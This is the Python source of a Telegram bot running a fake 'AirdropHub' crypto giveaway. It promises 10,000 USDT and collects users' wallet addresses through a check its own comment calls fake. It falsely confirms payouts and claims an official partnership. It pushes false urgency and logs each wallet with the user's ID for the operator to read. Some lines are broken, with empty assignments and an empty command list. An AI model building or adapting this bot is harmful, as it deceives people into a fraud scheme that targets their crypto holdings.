import telebot
from telebot import types
import os
import time

TOKEN = os.getenv("TOKEN")
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

wallets =  # chat_id: user_id: wallet

@bot.message_handler(commands=['start'])
def start(message):
    text = """
<b>🚀 Welcome to AirdropHub!</b>

We're distributing <b>10,000 USDT</b> to early users.  
No fees. No KYC. Just verify your wallet.

Type /claim to get started!  
Limited spots – join our channel: t.me/AirdropHubOfficial
    """
    bot.reply_to(message, text)

@bot.message_handler(commands= )
def claim(message):
    markup = types.ForceReply()
    bot.reply_to(message, "📩 Enter your wallet address (BSC/ETH/Solana):", reply_markup=markup)

@bot.message_handler(func=lambda m: True)
def save_wallet(message):
    if message.reply_to_message and "wallet address" in message.reply_to_message.text:
        wallet = message.text.strip()
        if len(wallet) < 30:  # fake check
            bot.reply_to(message, "Invalid address! Try again.")
        else:
            wallets = wallet
            bot.reply_to(message, "✅ Wallet saved! Airdrop confirmed – you'll receive in 48 hours. Stay tuned! 🚀")
            print(f"New wallet: {wallet} from {message.from_user.id}")  # you see this in Render logs

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "Airdrop Phase 2: <b>48 hours left</b>\n5,000 spots remaining. Claim now!")

@bot.message_handler(commands=['faq'])
def faq(message):
    text = """
<b>FAQ</b>
Q: Is this legit?  
A: Yes – official partnership with .  

Q: How do I get paid?  
A: Tokens auto-drop to your wallet after verification.  

Join t.me/AirdropHubOfficial for updates!
    """
    bot.reply_to(message, text)

print("Airdrop bot running...")
bot.polling(none_stop=True)
